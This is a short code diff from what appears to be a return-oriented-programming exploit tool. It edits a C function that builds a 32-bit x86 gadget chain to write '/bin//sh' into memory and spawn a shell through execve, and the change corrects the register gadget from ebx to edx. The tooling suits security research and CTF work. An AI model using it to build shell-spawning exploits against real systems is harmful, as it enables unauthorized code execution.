@@ -103,13 +103,13 @@ int rop_chain_execve(struct Node *root, struct Gadget *head)
     size_t i = 0;
     printf("\n--- Start chain *execve(\"/bin/sh\")* gadgets ---\n\n");
     rop_chain_list_init(head);
-    result *= rop_search_gadgets(root, head, "pop ebx;ret", 1);
+    result *= rop_search_gadgets(root, head, "pop edx;ret", 1);
     rop_chain_list_add(head, 0x080ef060, "@. data");
     result *= rop_search_gadgets(root, head, "pop eax;ret", 1);
     rop_chain_list_add(head, 0x6e69622f, "/bin");
     result *= rop_search_gadgets(root, head, "mov dword ptr [edx], eax;ret", 1);
 
-    result *= rop_search_gadgets(root, head, "pop ebx;ret", 1);
+    result *= rop_search_gadgets(root, head, "pop edx;ret", 1);
     rop_chain_list_add(head, 0x080ef064, "@. data + 4");
     result *= rop_search_gadgets(root, head, "pop eax;ret", 1);
     rop_chain_list_add(head, 0x68732f2f, "//sh");
